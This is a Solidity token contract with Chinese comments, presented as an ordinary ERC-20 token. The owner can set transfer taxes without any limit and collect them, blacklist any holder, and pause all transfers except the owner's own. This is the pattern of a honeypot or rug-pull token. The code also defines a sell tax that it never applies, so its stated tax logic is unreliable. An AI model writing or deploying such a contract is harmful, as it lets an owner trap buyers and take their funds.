// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CustomToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public buyTaxRate; // 买入税率
    uint256 public sellTaxRate; // 卖出税率
    bool public sellingPaused;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isBlacklisted;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event AddedToBlacklist(address indexed account);
    event RemovedFromBlacklist(address indexed account);
    event SellingPaused();
    event SellingUnpaused();
    event BuyTaxRateChanged(uint256 newRate);
    event SellTaxRateChanged(uint256 newRate);
    
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }
    
    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        uint256 initialSupply,
        uint256 initialBuyTaxRate,
        uint256 initialSellTaxRate
    ) {
        name = tokenName;
        symbol = tokenSymbol;
        decimals = tokenDecimals;
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        buyTaxRate = initialBuyTaxRate;
        sellTaxRate = initialSellTaxRate;
        owner = msg.sender;
        sellingPaused = false;
    }
      // 设置买入税率，只有合约所有者可以调用
    function setBuyTaxRate(uint256 newRate) external onlyOwner {
        buyTaxRate = newRate;
        emit BuyTaxRateChanged(newRate);
    }

    // 设置卖出税率，只有合约所有者可以调用
    function setSellTaxRate(uint256 newRate) external onlyOwner {
        sellTaxRate = newRate;
        emit SellTaxRateChanged(newRate);
    }
    
    function transfer(address recipient, uint256 amount) external returns (bool) {
        require(recipient != address(0), "ERC20: Transfer to the zero address");
        uint256 taxAmount = calculateTax(amount, buyTaxRate);
        uint256 afterTaxAmount = amount - taxAmount;
        require(balanceOf[msg.sender] >= amount, "ERC20: Insufficient balance");
        require(!isBlacklisted[msg.sender], "Sender is blacklisted");
        require(!sellingPaused || msg.sender == owner, "Selling is paused");
        
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += afterTaxAmount;
        emit Transfer(msg.sender, recipient, afterTaxAmount);
        
        if (taxAmount > 0) {
            balanceOf[owner] += taxAmount;
            emit Transfer(msg.sender, owner, taxAmount);
        }
        
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(sender != address(0), "ERC20: Transfer from the zero address");
        require(recipient != address(0), "ERC20: Transfer to the zero address");
        uint256 taxAmount = calculateTax(amount, buyTaxRate);
        uint256 afterTaxAmount = amount - taxAmount;
        require(balanceOf[sender] >= amount, "ERC20: Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "ERC20: Allowance exceeded");
        require(!isBlacklisted[sender], "Sender is blacklisted");
        require(!sellingPaused || msg.sender == owner, "Selling is paused");
        
        balanceOf[sender] -= amount;
        balanceOf[recipient] += afterTaxAmount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, afterTaxAmount);
        
        if (taxAmount > 0) {
            balanceOf[owner] += taxAmount;
            emit Transfer(sender, owner, taxAmount);
        }
        
        return true;
    }
    
    function addToBlacklist(address account) external onlyOwner {
        isBlacklisted[account] = true;
        emit AddedToBlacklist(account);
    }
    
    function removeFromBlacklist(address account) external onlyOwner {
        isBlacklisted[account] = false;
        emit RemovedFromBlacklist(account);
    }
    
    function pauseSelling() external onlyOwner {
        sellingPaused = true;
        emit SellingPaused();
    }
    
    function unpauseSelling() external onlyOwner {
        sellingPaused = false;
        emit SellingUnpaused();
    }
    
    function calculateTax(uint256 amount, uint256 taxRate) internal pure returns (uint256) {
        return (amount * taxRate) / 100;
    }
}